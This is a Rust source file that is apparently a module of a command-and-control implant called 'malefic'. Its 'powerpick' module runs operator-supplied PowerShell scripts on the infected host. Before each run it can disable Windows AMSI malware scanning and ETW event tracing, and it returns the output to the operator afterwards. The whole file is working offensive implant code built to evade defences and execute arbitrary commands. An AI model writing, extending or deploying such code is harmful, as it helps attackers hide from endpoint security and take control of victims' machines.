use std::ffi::CString;

use crate::{check_field_optional, check_request, to_error, Module, Result, TaskResult};
use malefic_helper::protobuf::implantpb::spite::Body;
use malefic_helper::protobuf::implantpb::AssemblyResponse;

use async_trait::async_trait;
use malefic_helper::win::kit::bypass::{bypass_amsi, bypass_etw, enable_amsi, enable_etw};
use malefic_helper::win::kit::pwsh::pwsh_exec_command;
use malefic_trait::module_impl;
use prost::Message;

pub struct ExecutePowershell {}

#[async_trait]
#[module_impl("powerpick")]
impl Module for ExecutePowershell {
    #[allow(unused_variables)]
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut crate::Input,
        sender: &mut crate::Output,
    ) -> Result {
        let clr_request = check_request!(receiver, Body::ExecuteClr)?;
        let request = check_field_optional!(clr_request.execute_binary)?;
        let amsi_bypass = clr_request.amsi_bypass;
        let etw_bypass = clr_request.etw_bypass;

        let script = String::from_utf8(request.bin).expect("Invalid UTF-8 sequence");
        let result: Vec<u8>;
        unsafe {
            if amsi_bypass {
                bypass_amsi();
            }
            if etw_bypass {
                bypass_etw();
            }
            let ret = pwsh_exec_command(&script);
            result = ret.encode_to_vec();
            if amsi_bypass {
                enable_amsi();
            }
            if etw_bypass {
                enable_etw();
            }
        }
        Ok(TaskResult::new_with_body(id, Body::AssemblyResponse(AssemblyResponse{
            status: 0,
            data: result,
            err: "".to_string(),
        })))
    }
}
